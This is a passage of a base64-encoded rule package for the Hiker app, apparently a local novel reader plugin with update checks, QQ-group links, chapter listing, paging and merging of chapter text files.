JdGVtKHRpZCArIFxcXCIj6K6+572uX+abtOaWsFxcXCIsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5bey57uP5piv5pyA5paw54mI5pys5LqGXFxcIlxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+W3sue7j+aYr+acgOaWsOeJiOacrOS6hlxcXCI7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbSh0aWQgKyBcXFwiI+iuvue9rl/mm7TmlrBcXFwiLCB7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuacieaWsOeJiOacrOi/mOacquabtOaWsFxcXCJcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIHRvYXN0KFxcXCLmnInmlrDniYjmnKzov5jmnKrmm7TmlrBcXFwiKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJydWxlOi8vNXJXMzZaaVU2S2VHNTVXTTc3K2xhRzl0WlY5eWRXeGxYM1Z5Yk8rL3BXaDBkSEE2THk5b2FXdGxjaTV1YjJ0cFlTNXdjbVZ6Y3k5b2FXdGxjblZzWlM5eWRXeGxiR2x6ZEM1cWMyOXVQMmxrUFRNMU5Uaz1cXFwiO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHRpZCArIFxcXCIj6K6+572uX+abtOaWsFxcXCIsIHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLkv6Hmga/ojrflj5blpLHotKVcXFwiXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+abtOaWsOS/oeaBr+iOt+WPluWksei0pVxcXCI7XFxuICAgICAgICB9XFxuICAgIH0sIE1ZX1BBUkFNUy52ZXJzaW9uLCB0aWQpLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgaWQ6IHRpZCArIFxcXCIj6K6+572uX+abtOaWsFxcXCJcXG4gICAgfVxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLlhbPkuo7lpoLkvZXosIPnlKhcXFwiLFxcbiAgICB1cmw6IFxcXCJtcXFhcGk6Ly9mb3J3YXJkL3VybD9zcmNfdHlwZT13ZWImc3R5bGU9ZGVmYXVsdCZwbGdfYXV0aD0xJnZlcnNpb249MSZ1cmxfcHJlZml4PWFIUjBjSE02THk5eGRXNHVjWEV1WTI5dEwzRnhkMlZpTDNGMWJuQnlieTl6YUdGeVpUOWZkM1k5TXlaZmQzZDJQVEV5T0NacGJuWnBkR1ZEYjJSbFBURklSbmxDU2labWNtOXRQVEkwTmpZeE1DWmlhWG85YTJFakwyOTFkQT09XFxcIixcXG4gICAgZGVzYzogXFxcIuivpue7hueCueWHu+WKoOWFpemikemBkyjlv6vmnaXljY7lsbHkuI7miJHorrpbamld5YmRKVxcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLpl67popjlj43ppohcXFwiLFxcbiAgICB1cmw6IFxcXCJtcXFhcGk6Ly9mb3J3YXJkL3VybD9zcmNfdHlwZT13ZWImc3R5bGU9ZGVmYXVsdCZwbGdfYXV0aD0xJnZlcnNpb249MSZ1cmxfcHJlZml4PWFIUjBjSE02THk5eGRXNHVjWEV1WTI5dEwzRnhkMlZpTDNGMWJuQnlieTl6YUdGeVpUOWZkM1k5TXlaZmQzZDJQVEV5T0NaaGNIQkRhR0Z1Ym1Wc1BYTm9ZWEpsSm1sdWRtbDBaVU52WkdVOU1WaE9ZV3hCUlhsMlZtb21ZMjl1ZEdWdWRFbEVQV016YkVsUUptSjFjMmx1WlhOelZIbHdaVDB5Sm1aeWIyMDlNVGd4TURjMEptSnBlajFyWVNadFlXbHVVMjkxY21ObFNXUTljMmhoY21VbWMzVmlVMjkxY21ObFNXUTliM1JvWlhKekptcDFiWEJ6YjNWeVkyVTljMmh2Y25SMWNtdz0mdD0xNjcxODkzMTIzNTk3I0ludGVudDtzY2hlbWU9bXFxYXBpO3BhY2thZ2U9Y29tLnRlbmNlbnQubW9iaWxlcXE7ZW5kXFxcIixcXG4gICAgZGVzYzogXFxcIue7neWvueS4jeS8muaciWJ1ZyjllYrmiJHkuI3mjqXlj5chKVxcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcbi8qXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIua4hemZpOWwj+ivtOWIhumhteiusOW9lVxcXCIsXFxuICAgIHVybDogJChcXFwi56Gu6K6k5riF6Zmk5bCP6K+05YiG6aG16K6w5b2V77yfXFxcIikuY29uZmlybSgoKSA9PiB7XFxuICAgICAgICBkZWxldGVGaWxlKFxcXCJub3ZlbEZvb3RwcmludC5qc29uXFxcIik7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5riF6Zmk5a6M5oiQXFxcIjtcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbn0pO1xcbiovXFxuc2V0UmVzdWx0KGxheW91dCk7XCJ9LHtcImNvbF90eXBlXCI6XCJ0ZXh0XzFcIixcIm5hbWVcIjpcIiN2LuWwj+ivtOeroOiKguWIl+ihqFwiLFwicGF0aFwiOlwiTm92ZWxCcm93c2VyLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmlmIChnZXRQYXJhbShcXFwiaGFzUGFyYW1zXFxcIikgPT09IFxcXCJ0cnVlXFxcIikge1xcbiAgICBNWV9QQVJBTVMgPSB7XFxuICAgICAgICBwYXRoOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcInBhdGhcXFwiKSksXFxuICAgICAgICBuYW1lOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcIm5hbWVcXFwiKSlcXG4gICAgfVxcbn1cXG5sZXQgcGF0aCA9IE1ZX1BBUkFNUy5wYXRoO1xcbnNldFBhZ2VUaXRsZShcXFwiTlZ8XFxcIiArIE1ZX1BBUkFNUy5uYW1lKTtcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbmNvbnN0IFRvb2wgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9Ub29sLmpzXFxcIik7XFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuY29uc3QgYm9va0luZm8gPSBPYmplY3QuYXNzaWduKHtcXG4gICAgZm9vdDogMCxcXG4gICAgaXNSZXBsYWNlOiB0cnVlLFxcbiAgICBpc1NlZ21lbnQ6IHRydWVcXG59LCBKU09OLnBhcnNlKHJlcXVlc3QoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCArIFxcXCIvYm9va0luZm8uanNvblxcXCIpIHx8IFxcXCJ7fVxcXCIpKTtcXG5sZXQgaWQgPSBcXFwiI1xcXCIgKyBuZXcgRGF0ZSgpLmdldFRpbWUoKTtcXG52YXIgbGF5b3V0ID0gW107XFxubGV0IG1vZGUgPSBnZXRNeVZhcihcXFwiLm1vZGVcXFwiLCBcXFwiMFxcXCIpO1xcbmxldCBtb2RlMiA9IGdldE15VmFyKFxcXCIubW9kZTJcXFwiLCBDb25maWcuZGVmX2lzUGFnaW5hdGUpO1xcblxcbmxldCBpc1JldmVyc2UgPSBnZXRNeVZhcihcXFwiLmlzUmV2ZXJzZVxcXCIsIFxcXCIwXFxcIik7XFxuYWRkTGlzdGVuZXIoXFxcIm9uQ2xvc2VcXFwiLCAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgY2xlYXJNeVZhcihcXFwiLm1vZGVcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihcXFwiLm1vZGUyXFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcIi5pc1JldmVyc2VcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihcXFwiLnBhZ2VOdW1cXFwiKTtcXG59KSk7XFxuXFxuZnVuY3Rpb24gZ2V0VGl0bGUodGl0bGUpIHtcXG4gICAgbGV0IHRpdGxlcyA9IFRvb2wuc3BsaXQodGl0bGUsIFxcXCIkXFxcIiwgMik7XFxuICAgIHJldHVybiB0aXRsZXNbMl0gIT09IHVuZGVmaW5lZCA/IHRpdGxlc1syXS5zbGljZSgwLCB0aXRsZXNbMl0ubGFzdEluZGV4T2YoXFxcIi5cXFwiKSkgOiB0aXRsZTtcXG59XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuWIoOmZpOaVtOacrFxcXCIsXFxuICAgIHVybDogJChcXFwi56Gu6K6k5Yig6Zmk5pW05pys5bCP6K+077yfXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgICAgIGlmIChGaWxlLmRlbGV0ZUZpbGVzKHBhdGgpKSB7XFxuICAgICAgICAgICAgYmFjaygpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/liKDpmaTmiJDlip9cXFwiO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcIjtcXG4gICAgICAgIH1cXG4gICAgfSwgcGF0aCksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFtcXFwi55yL5bCP6K+0XFxcIiwgXFxcIuWIoOmZpOeroOiKglxcXCJdW21vZGVdLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKG1vZGUpID0+IHtcXG4gICAgICAgIHB1dE15VmFyKFxcXCIubW9kZVxcXCIsIG1vZGUgPT09IFxcXCIwXFxcIiA/IFxcXCIxXFxcIiA6IFxcXCIwXFxcIik7XFxuICAgICAgICByZWZyZXNoUGFnZSh0cnVlKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgfSwgbW9kZSksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLigJjigJjmm7TlpJrlip/og70gPuKAmeKAmVxcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICBjb2xfdHlwZTogXFxcInNjcm9sbF9idXR0b25cXFwiXFxufSk7XFxuXFxuZnVuY3Rpb24gdHh0KHBhdGhzKSB7XFxuICAgIHNob3dMb2FkaW5nKFxcXCLmraPlnKjlkIjlubYuLi5cXFwiKTtcXG4gICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL1Rvb2wuanNcXFwiKTtcXG4gICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuXFxuICAgIGxldCBmaWxlbGlzdCA9IEZpbGUuZ2V0RmlsZVBhdGgocGF0aHMucGF0aCwgXFxcImZpbGVcXFwiLCBcXFwiLnR4dFxcXCIpO1xcbiAgICBsZXQgbGlzdExlbmd0aCA9IGZpbGVsaXN0Lmxlbmd0aDtcXG4gICAgaWYgKGxpc3RMZW5ndGggPT09IDApIHtcXG4gICAgICAgIGhpZGVMb2FkaW5nKCk7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v56m655qE56ug6IqCXFxcIjtcXG4gICAgfVxcbiAgICBjb25zdCBib29rSW5mbyA9IE9iamVjdC5hc3NpZ24oe1xcbiAgICAgICAgc2VsZWN0ZWQ6IFtdLFxcbiAgICAgICAgaXNSZXBsYWNlOiB0cnVlXFxuICAgIH0sIEpTT04ucGFyc2UocmVxdWVzdChcXFwiZmlsZTovL1xcXCIgKyBwYXRocy5wYXRoICsgXFxcIi9ib29rSW5mby5qc29uXFxcIikgfHwgXFxcInt9XFxcIikpO1xcbiAgICBsZXQgYnVmaWxlbGlzdCA9IFtdO1xcbiAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxpc3RMZW5ndGg7IGkrKykge1xcbiAgICAgICAgbGV0IGZpbGUgPSBmaWxlbGlzdFtpXTtcXG4gICAgICAgIGxldCBmaWxlSW5mbyA9IFRvb2wuc3BsaXQoZmlsZS5uYW1lLCBcXFwiJFxcXCIsIDIpO1xcbiAgICAgICAgYnVmaWxlbGlzdC5wdXNoKHtcXG4gICAgICAgICAgICBuYW1lOiBmaWxlSW5mb1syXS5zbGljZSgwLCBmaWxlSW5mb1syXS5sYXN0SW5kZXhPZihcXFwiLlxcXCIpKSxcXG4gICAgICAgICAgICBwYXRoOiBcXFwiZmlsZTovL1xcXCIgKyBmaWxlLnBhdGgsXFxuICAgICAgICAgICAgaWQ6IE51bWJlcihmaWxlSW5mb1swXSkgfHwgMFxcbiAgICAgICAgfSk7XFxuICAgIH1cXG4gICAgYnVmaWxlbGlzdC5zb3J0KChhLCBiKSA9PiBhLmlkIC0gYi5pZCk7XFxuICAgIGxldCBlbnRpcmVQYXRoID0gcGF0aHMucGF0aC5yZXBsYWNlKENvbmZpZy5ub3ZlbFBhdGgsIENvbmZpZy5ub3ZlbEZ1bGxQYXRoKSArIFxcXCIudHh0XFxcIjtcXG4gICAgbGV0IGVudGlyZVBhdGh0byA9IGJvb2tJbmZvLmlzUmVwbGFjZSA/IGVudGlyZVBhdGggKyBcXFwiLnRtcFxcXCIgOiBlbnRpcmVQYXRoO1xcblxcbiAgICBpZiAoZmlsZUV4aXN0KFxcXCJmaWxlOi8vXFxcIiArIGVudGlyZVBhdGgpKSB7XFxuICAgICAgICB0b2FzdChcXFwi5Yid5aeL5YyW5paH5Lu2XFxcIik7XFxuICAgICAgICBpZiAoIUZpbGUuZGVsZXRlRmlsZXMoZW50aXJlUGF0aCkpIHtcXG4gICAgICAgICAgICBoaWRlTG9hZGluZygpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/liJ3lp4vljJblpLHotKVcXFwiO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICB0b2FzdChcXFwi5Yid5aeL5YyW5oiQ5YqfXFxcIik7XFxuICAgICAgICB9XFxuICAgIH1cXG5cXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsaXN0TGVuZ3RoOyBpKyspIHtcXG4gICAgICAgIGxldCBpdGVtID0gYnVmaWxlbGlzdFtpXTtcXG4gICAgICAgIGxldCBjb250ZW50ID0gcmVxdWVzdChpdGVtLnBhdGgpO1xcbiAgICAgICAgRmlsZS5maWxlV3JpdGVBcHBlbmQoZW50aXJlUGF0aHRvLCBpdGVtLm5hbWUgKyBcXFwiXFxcXG7jgIDjgIBcXFwiICsgY29udGVudC5yZXBsYWNlKC8mbmJzcDsvZyxcXFwiXFxcIikuc3BsaXQoLyhcXFxcbnxcXFxccikrLykuZmlsdGVyKGl0ID0+IGl0LnRyaW0oKS5sZW5ndGggPiAxKS5tYXAoaXQ9Pml0LnRyaW0oKSkuam9pbihcXFwiXFxcXHLjgIDjgIBcXFwiKSArIFxcXCJcXFxcblxcXFxuXFxcIik7XFxuICAgIH1cXG4gICAgaWYgKGJvb2tJbmZvLmlzUmVwbGFjZSkge1xcbiAgICAgICAgbGV0IHJ1bGVMaXN0ID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFwicmVwbGFjZVJ1bGUuanNvblxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgbGV0IGxlbiA9IHJ1bGVMaXN0Lmxlbmd0aDtcXG4gICAgICAgIGxldCByZXBsYWNlUGF0dGVybiA9IFtcXFwicmVwbGFjZVxcXCIsIFxcXCJyZXBsYWNlQWxsXFxcIl07XFxuICAgICAgICBsZXQgZmxhZyA9IEZpbGUuZmlsZVJ1bGUoZW50aXJlUGF0aHRvLCBlbnRpcmVQYXRoLCAoamF2YVN0cmluZykgPT4ge1xcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IHJlcGxhY2VSdWxlID0gcnVsZUxpc3RbaV07XFxuICAgICAgICAgICAgICAgIGlmICghYm9va0luZm8uc2VsZWN0ZWQuaW5jbHVkZXMocmVwbGFjZVJ1bGUuaWQpKSB7XFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBsZXQgcmVwbGFjZSA9IHJlcGxhY2VQYXR0ZXJuWzAgKyByZXBsYWNlUnVsZS5pc1JlZ2V4XTtcXG4gICAgICAgICAgICAgICAgamF2YVN0cmluZyA9IGphdmFTdHJpbmdbcmVwbGFjZV0ocmVwbGFjZVJ1bGUucGF0dGVybiwgcmVwbGFjZVJ1bGUucmVwbGFjZW1lbnQpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gamF2YVN0cmluZy5nZXRCeXRlcygpO1xcbiAgICAgICAgfSk7XFxuICAgICAgICBpZiAoIWZsYWcpIHtcXG4gICAgICAgICAgICBoaWRlTG9hZGluZygpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lkIjlubblpLHotKVcXFwiO1xcbiAgICAgICAgfVxcblxcbiAgICB9XFxuICAgIGhpZGVMb2FkaW5nKCk7XFxuICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lkIjlubblrozmiJBcXFwiO1xcbn1cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5ZCI5bm25bCP6K+0XFxcIixcXG4gICAgdXJsOiAkKFxcXCLnoa7lrprlkIjlubY/XFxcXG7kvJropobnm5blt7LmnIlUWFRcXFwiKS5jb25maXJtKHR4dCwgTVlfUEFSQU1TKSxcXG4gICAgY29sX3R5cGU6IFxcXCJzY3JvbGxfYnV0dG9uXFxcIlxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFtcXFwi4piQ5YiG6aG1XFxcIiwgXFxcIuKYkeWIhumhtVxcXCJdW21vZGUyXSxcXG4gICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChtb2RlMikgPT4ge1xcbiAgICAgICAgcHV0TXlWYXIoXFxcIi5tb2RlMlxcXCIsIG1vZGUyID09PSBcXFwiMFxcXCIgPyBcXFwiMVxcXCIgOiBcXFwiMFxcXCIpO1xcbiAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICB9LCBtb2RlMiksXFxuICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBbXFxcIuKYkOWIhuautVxcXCIsIFxcXCLimJHliIbmrrVcXFwiXVtOdW1iZXIoYm9va0luZm8uaXNTZWdtZW50KV0sXFxuICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoaXNTZWdtZW50LCBwYXRoKSA9PiB7XFxuICAgICAgICBjb25zdCBib29rSW5mbyA9IEpTT04ucGFyc2UocmVxdWVzdChcXFwiZmlsZTovL1xcXCIgKyBwYXRoICsgXFxcIi9ib29rSW5mby5qc29uXFxcIikgfHwgXFxcInt9XFxcIik7XFxuICAgICAgICBib29rSW5mby5pc1NlZ21lbnQgPSAhaXNTZWdtZW50O1xcbiAgICAgICAgd3JpdGVGaWxlKFxcXCJmaWxlOi8vXFxcIiArIHBhdGgrXFxcIi9ib29rSW5mby5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoYm9va0luZm8pKTtcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgIH0sIGJvb2tJbmZvLmlzU2VnbWVudCwgcGF0aCksXFxuICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5YeA5YyWXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL05vdmVsQ3VzdG9tLnZpZXcjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjI25vUmVmcmVzaCNcXFwiLFxcbiAgICBleHRyYTogTVlfUEFSQU1TLFxcbiAgICBjb2xfdHlwZTogXFxcInNjcm9sbF9idXR0b25cXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuWklumDqOafpeeci1xcXCIsXFxuICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgocGF0aCkgPT4ge1xcbiAgICAgICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuICAgICAgICBsZXQgZW50aXJlUGF0aCA9IHBhdGgucmVwbGFjZShDb25maWcubm92ZWxQYXRoLCBDb25maWcubm92ZWxGdWxsUGF0aCkgKyBcXFwiLnR4dFxcXCI7XFxuICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXCJmaWxlOi8vXFxcIiArIGVudGlyZVBhdGgpKSB7XFxuICAgICAgICAgICAgdG9hc3QoXFxcIuiwg+eUqOesrOS4ieaWueW6lOeUqOaJk+W8gOaWh+S7tlxcXCIpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwib3BlbkZpbGU6Ly9maWxlOi8vXFxcIiArIGVudGlyZVBhdGhcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+acrOWcsOaaguaXoOWPr+S+m+WklumDqOaJk+W8gOeahHR4dOaWh+S7tu+8jOivt+WFiOWQiOW5tuWwj+ivtO+8gVxcXCJcXG4gICAgICAgIH1cXG4gICAgfSwgcGF0aCksXFxuICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG59KTtcXG5cXG5sZXQgbWhsaXN0ID0gRmlsZS5nZXRGaWxlUGF0aChwYXRoLCBcXFwiZmlsZVxcXCIsIFxcXCIudHh0XFxcIik7XFxubWhsaXN0LnNvcnQoKGEsIGIpID0+IHtcXG4gICAgYSA9IChhLm5hbWUubWF0Y2goL1xcXFxkKy8pIHx8IFtdKVswXSB8fCAwO1xcbiAgICBiID0gKGIubmFtZS5tYXRjaCgvXFxcXGQrLykgfHwgW10pWzBdIHx8IDA7XFxuICAgIHJldHVybiBhIC0gYjtcXG59KTtcXG5sZXQgY2hhcHRlckxpc3QgPSBbXTtcXG5sZXQgY2hhcHRlckNvdW50ID0gbWhsaXN0Lmxlbmd0aDtcXG5cXG5pZiAobW9kZTIgPT09IFxcXCIxXFxcIikge1xcbiAgICBsZXQgbWhsaXN0Q2h1bmsgPSBUb29sLmNodW5rKG1obGlzdCwgQ29uZmlnLnZpZXdQYWdlU2l6ZSk7XFxuICAgIGxldCB2aWV3UGFnZUNvdW50ID0gbWhsaXN0Q2h1bmsubGVuZ3RoO1xcbiAgICBsZXQgZGVmUGFnZSA9ICh2aWV3UGFnZUNvdW50IC0gMSA8IGJvb2tJbmZvLmZvb3QgPyAwIDogYm9va0luZm8uZm9vdCkgfHwgMDtcXG4gICAgbGV0IHBhZ2VOdW0gPSBOdW1iZXIoZ2V0TXlWYXIoXFxcIi5wYWdlTnVtXFxcIiwgXFxcIlxcXCIgKyBkZWZQYWdlKSk7XFxuICAgIGNoYXB0ZXJMaXN0ID0gbWhsaXN0Q2h1bmtbcGFnZU51bV0gfHwgW107XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIFxcXCLnq6DoioIgXFxcIi5iaWcoKSArIChcXFwi5pys6aG1OlxcXCIgKyBjaGFwdGVyTGlzdC5sZW5ndGggKyBcXFwiIOWFseaciTpcXFwiICsgY2hhcHRlckNvdW50ICsgXFxcIueroCDlvZPliY06XFxcIiArIChwYWdlTnVtICsgMSkgKyBcXFwiL1xcXCIgKyB2aWV3UGFnZUNvdW50KS5zbWFsbCgpLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChpc1JldmVyc2UpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiLmlzUmV2ZXJzZVxcXCIsIGlzUmV2ZXJzZSA9PT0gXFxcIjBcXFwiID8gXFxcIjFcXFwiIDogXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSh0cnVlKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgICAgICB9LCBpc1JldmVyc2UpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIui3s+mbhlxcXCIsXFxuICAgICAgICB1cmw6ICQoY2hhcHRlckNvdW50LCBcXFwi6L6T5YWl6Lez6L2s56ug6IqCIDEtXFxcIiArIGNoYXB0ZXJDb3VudCkuaW5wdXQoKGNoYXB0ZXJDb3VudCwgcGFnZU51bSwgdmlld1BhZ2VTaXplLCBwYXRoKSA9PiB7XFxuICAgICAgICAgICAgbGV0IGlucHV0TnVtID0gTnVtYmVyKGlucHV0KTtcXG4gICAgICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKGlucHV0TnVtKSB8fCBpbnB1dE51bSA8IDAgfHwgaW5wdXROdW0gPiBjaGFwdGVyQ291bnQpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+ivt+i+k+WFpeato+ehruiMg+WbtOWGheeahOaVsOWtl1xcXCI7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGlucHV0TnVtID0gTWF0aC5mbG9vcigoaW5wdXROdW0gKyB2aWV3UGFnZVNpemUpIC8gdmlld1BhZ2VTaXplKSAtIDE7XFxuICAgICAgICAgICAgaWYgKHBhZ2VOdW0gPT09IGlucHV0TnVtKSByZXR1cm4gXFxcInRvYXN0Oi8v5q2j5Zyo5b2T5YmN6aG16Z2iXFxcIjtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiLnBhZ2VOdW1cXFwiLCBcXFwiXFxcIiArIGlucHV0TnVtKTtcXG4gICAgICAgICAgICBjb25zdCBib29rSW5mbyA9IEpTT04ucGFyc2UocmVxdWVzdChcXFwiZmlsZTovL1xcXCIgKyBwYXRoICsgXFxcIi9ib29rSW5mby5qc29uXFxcIikgfHwgXFxcInt9XFxcIik7XFxuICAgICAgICAgICAgYm9va0luZm8uZm9vdCA9IGlucHV0TnVtO1xcbiAgICAgICAgICAgIHdyaXRlRmlsZShcXFwiZmlsZTovL1xcXCIgKyBwYXRoLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIH0sIGNoYXB0ZXJDb3VudCwgcGFnZU51bSwgQ29uZmlnLnZpZXdQYWdlU2l6ZSwgcGF0aCksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfNVxcXCJcXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi6Lez6aG1XFxcIixcXG4gICAgICAgIHVybDogJChwYWdlTnVtICsgMSwgXFxcIui3s+i9rOmhteaVsCAxLVxcXCIgKyB2aWV3UGFnZUNvdW50KS5pbnB1dCgodmlld1BhZ2VDb3VudCwgcGFnZU51bSwgcGF0aCkgPT4ge1xcbiAgICAgICAgICAgIGxldCBpbnB1dE51bSA9IE51bWJlcihpbnB1dCkgLSAxO1xcbiAgICAgICAgICAgIGlmIChOdW1iZXIuaXNOYU4oaW5wdXROdW0pIHx8IGlucHV0TnVtIDwgMCB8fCBpbnB1dE51bSA+IHZpZXdQYWdlQ291bnQgLSAxKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/or7fovpPlhaXmraPnoa7ojIPlm7TlhoXnmoTmlbDlrZdcXFwiO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBpZiAocGFnZU51bSA9PT0gaW5wdXROdW0pIHJldHVybiBcXFwidG9hc3Q6Ly/mraPlnKjlvZPliY3pobXpnaJcX